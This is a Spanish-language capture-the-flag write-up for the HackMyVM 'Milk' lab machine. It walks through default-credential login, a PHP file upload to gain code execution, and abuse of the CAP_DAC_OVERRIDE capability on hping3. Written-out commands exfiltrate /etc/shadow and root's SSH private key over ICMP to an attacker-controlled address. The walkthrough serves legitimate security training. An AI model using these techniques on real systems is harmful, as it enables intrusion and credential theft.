---
layout      : post
title       : "HackMyVM - Milk"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_banner.png
category    : [ hmv ]
tags        : [ capabilities, hping3, arbitrary-file-upload, CAP_DAC_OVERRIDE, ssh-keys ]
---
M√°quina Linux nivel medio. Subida arbitraria de objetos **.php** yyy archivos que viajan en paquetes **ICMP** (esto mediante **hping3** y la **capability** **CAP_DAC_OVERRIDE**).

## TL;DR (Spanish writeup)

**Creada por**: [sml](https://hackmyvm.eu/profile/?user=sml).

> <span style="color: yellow">Descargamos la m√°quina ac√°</span>: [HackMyVM - Milk](https://hackmyvm.eu/machines/machine.php?vm=Milk).

"Emp√°came bien lindo el carro, por favor!"

Llegaremos a un concesionario virtual para estrenar carro, nos saltaremos un login administrativo con credenciales por default, ya dentro y con ayuda de internet tendremos un exploit para llevar a cabo una subida arbitraria de archivos, usaremos eso para alojar en el servidor un archivo `.php` que ejecutar√° por nosotros c√≥digo malicioso y nos permitir√° obtener una terminal en el sistema como el usuario `www-data`.

Ya adentro vamos a encontrar la `capability` `CAP_DAC_OVERRIDE` asociada al ejecutable `hping3` (un ***ping*** mamado), esta **capability** en s√≠ permite leer, modificar y escribir archivos en tooodo el sistema, sin importar permisos. Vamos a jugar con `hping3` para mediante paquetes ***ICMP*** enviar archivos internos entre v√≠ctima y atacante.

...

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) üòÑ La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¬øpor qu√© no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

The light soul.

1. [Reconocimiento](#reconocimiento).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorriendo el servidor web](#puerto-80).
3. [Explotaci√≥n](#explotacion).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Como es usual en esta plataforma, descargamos la VM, la cargamos en el virtualizador, la iniciamos y ahora viene la parte juguetona, encontrar su IP. 

En este caso usaremos la herramienta `nmap` para ello.

Yo tengo una red **NAT** configurada para que toda m√°quina que agregue a esa red tome una IP entre el rango `192.168.100.0/24` (`192.168.100.1` - `192.168.100.254`), as√≠ que hagamos un escaneo sobre ese rango a ver cu√°l suena llamativa:

```bash
nmap -sn 192.168.100.0/24
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -sn       | Env√≠a trazas ICMP (un ping) |

Y obtenemos, el [gateway](https://www.puertadeenlace.com/faq/general/46-que-es-una-puerta-de-enlace-gateway) de la red, mi IP y una nueva, as√≠ que esa debe ser la de la m√°quina **Milk**:

```bash
# Gateway
Nmap scan report for 192.168.100.1
Host is up (0.00075s latency).
# La mia
Nmap scan report for 192.168.100.7
Host is up (0.00011s latency).
# Probablemente la de la m√°quina v√≠ctima
Nmap scan report for 192.168.100.27
Host is up (0.00041s latency).
```

Pues listo, juguemos con `nmap` y descubramos que puertos (servicios) tiene expuestos, as√≠ sabemos si estamos apuntando a donde es:

```bash
nmap -p- --open -v 192.168.100.27 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos estos servicios expuestos:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Que nos ayuda a generar terminales de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Que ser√≠a el servidor web. |

**+ ~ +(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuvi√©ramos varios evitamos tener que escribirlos uno a uno**
 
```bash
ÔÑÅ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 192.168.100.27
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)+ ~ +**

Listones, lo siguiente y con ayuda de `nmap` es ver que versiones de software est√°n siendo ejecutadas y adem√°s, pedirle el favor a **nmap** de que ejecute algunos scripts a ver si detecta algo nuevo para nosotros.

```bash
nmap -p 22,80 -sCV 192.168.100.27 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Nos encuentra:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 80     | HTTP     | nginx 1.14.2 |

Pero poco m√°s, exploremos a ver con que nos encontramos.

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

Buscando no vemos nada interesante para el puerto 22, caig√°mosle al servidor web:

## reCorriendo en la web [üìå](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80.png" style="width: 100%;"/>

D√°ndole vueltas a la web, hay varias cosas que nos pueden desconcentrar, pero al final encontramos un login administrativo:

* http://192.168.100.27/admin/

---

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_admin.png" style="width: 100%;"/>

# Explotaci√≥n [#](#explotacion) {#explotacion}

> Empezamos de una :P

Si hacemos una de las m√°s famosas comprobaciones: `admin : admin` logramos bypassear el login e ingresar al dashboard del sitio:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_dashboard.png" style="width: 100%;"/>

Algo que not√© en los t√≠tulos de la web principal y el **dashboard** es la referencia hacia `Car Rental Portal`, esto puede ser algo gen√©rico, algo que al creador se le ocurri√≥ o un software leg√≠timo, buscando en internet textualmente `car rental portal` y mirando las im√°genes, vemos que hay algunas con la misma estructura que tenemos en el **home**, por lo que puede ser un software leg√≠timo.

Si hacemos una b√∫squeda m√°s "profunda" y directa agregando `exploit` a la consulta anterior, llegamos aaaa:

* [Car Rental Management System 1.0 - Arbitrary File Upload](https://www.exploit-db.com/exploits/48931).
* [Github - CRS-RCE-Exploit](https://github.com/LongWayHomie/CRS-RCE-Exploit).

> Solo que ac√° tenemos unas variaciones, en este caso el desarrollador y la configuraci√≥n asignada internamente es distinta a la de los exploits, un ejemplo r√°pido seria: un script hace una peticion hacia el archivo `agregar_carrito.php`, pero en nuestra m√°quina victima no existe ese archivo, pero si uno que se llama `agregar_auto.php`.

La explotaci√≥n es muyyyy sencilla, una subida arbitraria de archivos que nos permite ejecutar comando en el sistema, la cl√°sica demoledora: subir un objeto `.php` juguet√≥n y a mimir üõå 

Seguir√≠amos estos pasos:

üö© Creamos objeto `.php` con el contenido malicioso, por ejemplo para ejecutar la funci√≥n `phpinfo()` (que nos muestra un mont√≥n de info relacionada con el servicio **PHP** en el servidor):

```bash
echo '<?php phpinfo(); ?>' > a_bailar.php
```

üö© Creamos una marca de carro para que el siguiente paso no nos d√© problemas:

* http://192.168.100.27/admin/create-brand.php

üö© Buscamos el apartado para agregar un carro/auto/coche, llenamos todos los campos necesarios, adjuntamos el `.php` creado (como im√°genes en **Upload Images**) y guardamos. 

En nuestro cas√≥ ese recurso est√° ac√°:

* http://192.168.100.27/admin/post-avehical.php

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_postAvehical.png" style="width: 100%;"/>

üö© Despu√©s buscamos la ruta donde ha sido subida la imagen, para ello vamos a "Manage Vehicles" y damos clic en el icono de editar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_manageVehicles.png" style="width: 100%;"/>

üö© Ah√≠ ya tendr√≠amos el preview de las im√°genes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_fakePreviewImages.png" style="width: 100%;"/>

üö© Damos clic derecho en alguna y seleccionamos "Abrir imagen en una nueva pesta√±a", nos encontraremos el objeto `PHP` yyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_RCEconfirmed_phpinfo.png" style="width: 100%;"/>

TENEMOSSSSS ejecuci√≥n del c√≥digo `PHP`, y con estooooooo, ya podemos usar funciones de **PHP** para inyectar comandos en el sistema!

Como pr√°ctica les dejo que se armen ustedes mismos la reverse shell y obtengan una terminal en el sistema (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_RCEconfirmed_wwwdataRevSH.png" style="width: 100%;"/>

> Si quieren dejar su terminal funcional (tener historico, poder moverse entre comandos, ejecutar **CTRL+C** sin temor a perderla y darle color) caigan ac√°: [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

Ahora a ver que encontramos...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Despu√©s de dar unas vueltas por el sistema intentando migrarnos a un usuario llamado `milk` encontramos cositas comprometedoras directamente hacia el usuario `root`.

Listando las `capabilities` que existen en el sistema, notamos una distinta a las de siempre, pero antes, explicaci√≥n r√°pida:

> <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_google_linuxCapabilities.png" style="width: 100%;"/>
> Tomada de [etl.it.uc3m.es](http://www.etl.it.uc3m.es/Linux_Capabilities)

Jmmm, permisos exclusivamente en procesos y no en objetos completos, interesante (: Revisemos que `capabilities` hay en el sistema:

```bash
getcap -r / 2>/dev/null
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_wwwdataSH_getcap_showCapabilities.png" style="width: 100%;"/>

La de `ping` la hemos visto varias veces, peeero la de `hping3` es nueva y llamativa, hay varias cosas a revisar de esa l√≠nea:

> üï∏Ô∏è `hping3` se plantea como un upgrade del famoso `ping`, ya que permite modificar el envi√≥ de los paquetes, lo que abre la puerta a un control total de lo que se requiere en la comunicaci√≥n. Todo esto seg√∫n [redeszone.net](https://www.redeszone.net/tutoriales/seguridad/hping3-manipular-paquetes-tcp-ip-ataques/).

> üîí "`CAP_DAC_OVERRIDE` Bypass file read, write, and execute permission checks." ~ [man capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).

Uhhhhhhhh, significa que podemos leer, escribir y ejecutar cualquier objeto del sistema salt√°ndonos los permisos que tenga ü§≠ Solo queeee, tenemos que hacer eso usando `hping3`...

> üîç Te dejo [este recurso donde se explica como se podria escalar privilegios con cada **capability**](https://forums.grsecurity.net/viewtopic.php?f=7&t=2522&sid=c6fbcf62fd5d3472562540a7e608ce4e#p10271).

---

## Espiando archivos del sistema mediante paquetes ICMP [üìå](#hping3-data-file) {#hping3-data-file}

Lo primero que hacemos es ver las opciones propias del binario `hping3` a ver cu√°les pueden ser interesantes, entre ellas vemos:

```bash
www-data@milk:~$ hping3 -h
...
  -E  --file       data from file
...
```

Un par√°metro toma informaci√≥n desde un archivo, pero esto est√° muy ambiguo, busquemos en internet a ver si hay info m√°s detallada de que hacer con esto.

* [How to manipulate payload data sent through a packet using ICMP ping?](https://imsurajkr.github.io/blog/hping3)

> üîú "If we want to send a file from a system to another system over the network using ping command through ICMP tunnel." (so, use `hping3`). ~ [imsurajkr.github.io](https://imsurajkr.github.io/blog/hping3#what-if-we-want-to-manipulate-data-through-the-ping-command)

En el post nos indican que efectivamente con ***hping3*** podemos enviar archivos mediante paquetes ***ICMP***, para ello tenemos que usar los siguientes par√°metros (aunque buscando, hay varias maneras, ahorita les dejo las referencias):

M√°quina v√≠ctima:

```bash
/usr/sbin/hping3 -1 -E /etc/shadow -u -d 1500 192.168.100.7
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -1        | Le decimos a *hping3* que vamos a enviar paquetes *ICMP*. |
| -E        | Ac√° le indicamos el archivo del sistema que queremos enviar. (En este caso uno al que solo se tiene acceso con permisos privilegiados: el objeto que contiene las contrase√±as de cada usuario del sistema, [/etc/shadow](https://www.techtarget.com/searchsecurity/definition/shadow-password-file)). |
| -u        | Nos dir√° cuando la transferencia haya acabado. |
| -d        | Configuramos el tama√±o del paquete (del archivo en s√≠). |
| IP        | Le pasamos la direcci√≥n IP a la que vamos a enviarle los paquetes (o sea, la m√°quina atacante). |

Peeeero falta algo importante, no?

¬øC√≥mo vamos a recibir esos paquetes en nuestra m√°quina? Tenemos que ponernos en escucha de paquetes `ICMP` (como **root**):

```bash
tcpdump -i enp0s3 'icmp and src host 192.168.100.7' -w passwd_victim
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -i        | Es la interfaz con la que tenemos conexi√≥n hacia la m√°quina v√≠ctima (ejecuta `ip a` o `ifconfig` si no te la sabes). |
| icmp ...  | Le decimos que vamos a escuchar todos los paquetes *ICMP* que lleguen a X direcci√≥n, en este caso la de atacante (la nuestra). |
| -w        | Guardamos los paquetes en un archivo. |

> Y el post nos indica: "When its done you will see the **EOF reached** in the sender system." Cuando veamos ese mensaje, ya se habr√° completado la transferencia y podemos ejecutar **CTRL+C**.

Pues ya estamos:

1. Levantamos el listener mediante `tcpdump`.
2. Ejecutamos `hping3`, esperamos el mensaje de **EOF** y finalmenteeeeeeeee:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_wwwdataSH_hping3_listener_EOF_shadowFile.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_tcpdump_packetsReceived.png" style="width: 100%;"/>

Efectivamente, nos indica que recibimos 4 paquetes y estar√≠an ya en el objeto `passwd`, pues si lo abrimos (est√° en formato bytes, no ASCII, as√≠ que usamos `strings` en lugar de `cat`) vemooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_tcpdump_packetsReceived_stringsShadowFile.png" style="width: 100%;"/>

EPAAAALEEEEEE! Pos s√≠, tenemos la facultad de explorar objetos con permisos administrativooooos!

Ya que tenemos el objeto `shadow` pensar√≠amos en intentar romper el hash del usuario `root`, pero en esta ocasi√≥n no fue posible, ha de tener una contrase√±a fuerte o que no est√© en todos los diccionarios p√∫blicos.

¬øC√≥mo m√°s se te ocurre lograr una terminal como `root`?

¬°Exacto! Podemos buscar su llave privada **SSH**, recordemos que esta nos sirve como una contrase√±a (adem√°s, muchas configuraciones en entornos reales se manejan as√≠, no con contrase√±as, sino con llaves).

* [https://wiki.archlinux.org/title/SSH_keys](https://wiki.archlinux.org/title/SSH_keys)

As√≠ que pa lante, la ruta por default donde se encontrar√≠a para X usuario ser√≠a: `/home/usuario/.ssh/id_rsa`, solo que como el `$HOME` de ***root*** es `/root`, la ruta de su llave ser√≠a:

```bash
/root/.ssh/id_rsa
```

Levantamos el listener, ejecutamos el `hping3` con el nuevo archivo (y al ser un poco m√°s grande vamos a tener que jugar con el par√°metro `-d`) yyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_tcpdump_packetsReceived_stringsRootSSHidRSA.png" style="width: 100%;"/>

ESOOO! Existe la llave privada, pero debemos darle unos retoques, ya que unos caracteres est√°n generando basura y una l√≠nea se parti√≥ debido a eso.

Simplemente, tomamos el output de `-----BEGIN OPENSSH PRIVATE KEY-----` a `-----END OPENSSH PRIVATE KEY-----`, lo guardamos en un archivo, le borramos la l√≠nea de basura y subimos la l√≠nea separada para que quede igual a las dem√°s, finalmente guardamos, le damos permisos para que solo el propietario tenga acceso a ese objeto (`chmod 700 ARCHIVO`) y ejecutamos ***SSH*** como `root`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_bash_ssh_rootSHwithSSHstolenKEYS.png" style="width: 100%;"/>

Tamos dentrooooooooooooooooooooo! Veamos las flags...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_flags.png" style="width: 100%;"/>

Fino, hemos terminado.

...

Una m√°quina con una escalada que me encant√≥, probablemente ese privilegio no se asigne nunca en entornos reales, pero el que puedas mover archivos mediante `hping3` me parece bien ch√©vere, brutal, brutal.

Nos leeremos pronto, gracias por leer, a seguir d√°ndole y A seguir ROMPIENDO de TODOOOOOOOOOOOOOOOOOO!